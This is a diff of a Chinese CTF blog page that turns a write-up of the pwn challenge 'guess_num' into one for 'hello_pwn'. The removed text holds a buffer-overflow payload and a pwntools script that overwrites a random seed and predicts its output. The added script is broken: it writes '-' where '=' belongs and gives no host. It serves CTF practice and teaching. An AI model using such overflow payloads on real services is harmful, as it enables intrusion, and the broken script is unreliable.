@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-guess_num, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-hello_pwn, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界pwn-guess_num | 小哑师兄</title>
+    <title>攻防世界pwn-hello_pwn | 小哑师兄</title>
     <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-p97wgp.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-zyxvqy.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-guess_num</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-hello_pwn</h1>
                 </div>
             </div>
         </div>
@@ -363,7 +363,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-01
+                    2023-07-10
                 </div>
                 
 
@@ -372,7 +372,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    288
+                    33
                 </div>
                 
 
@@ -402,48 +402,13 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>通过IDA打开附件后，其中有srand随机数函数，当随机数种子变时，无论生成多少次随机数，所产生的随机数序列都是相同的。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714100108.png" style="zoom:50%;" /></p>
-<p>使用gets()函数进行处理，可以进行溢出，且输入和seed在栈空间中是连续的，在输入时，覆盖到seed[0] 即可</p>
-<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714141012.png" style="zoom:50%;" />
-gets获取到的输入与seed数组在栈中是连续的，gets长度为32，因此构造payload为
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>其中“1000”，是设置的随机数种子，在输入过程中，“1000”是按字符形式读取的，所以在生成时该数为“0x30303031”</p>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib></span></span>
-
-<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
-  
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0x30303031u</span><span class="token punctuation">;</span>
-    <span class="token function">srand</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-        cout<span class="token operator">&lt;&lt;</span>number<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token comment">//在Linux下进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>生成随机数：6235463161</p>
-<p>python脚本</p>
+                <p>参数覆盖 <strong>小端存储</strong><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222328.png" style="zoom: 50%;" /><br>两个函数参数相差4<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222443.png" style="zoom:50%;" /></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
+payload <span class="token operator">-</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'aaun'</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
-
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
-
-<span class="token comment">#sh = remote("61.147.171.105", 59395)</span>
-
-payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>
-libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>通过ctypes库来调用c函数生成随机数</p>
 
                 
             </div>
@@ -470,7 +435,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/2023/08/01/gong-fang-shi-jie-pwn-guess-num/">https://blog.yangsx.cn/2023/08/01/gong-fang-shi-jie-pwn-guess-num/</a>
+                    <a href="https://blog.yangsx.cn/ctf-pwn/7d1de980.html">https://blog.yangsx.cn/ctf-pwn/7d1de980.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -820,32 +785,44 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/08/20/xue-xi-zong-jie/">
+                <a href="/ctf-pwn/6d0f7c20.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpro7.jpg" class="responsive-img" alt="不能混吃等死!">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png" class="responsive-img" alt="攻防世界pwn-level2">
                         
-                        <span class="card-title">不能混吃等死!</span>
+                        <span class="card-title">攻防世界pwn-level2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录自己每天的学习情况!
+                            攻防世界入门题
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-12
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            小哑师兄
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -854,16 +831,16 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2023/07/26/gong-fang-shi-jie-pwn-forgot/">
+                <a href="/ctf-pwn/7d1de980.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-qzmgjq.jpg" class="responsive-img" alt="攻防世界pwn-forgot">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-zyxvqy.jpg" class="responsive-img" alt="攻防世界pwn-hello_pwn">
                         
-                        <span class="card-title">攻防世界pwn-forgot</span>
+                        <span class="card-title">攻防世界pwn-hello_pwn</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -874,7 +851,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
                             </span>
                         <span class="publish-author">
                             
@@ -888,6 +865,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
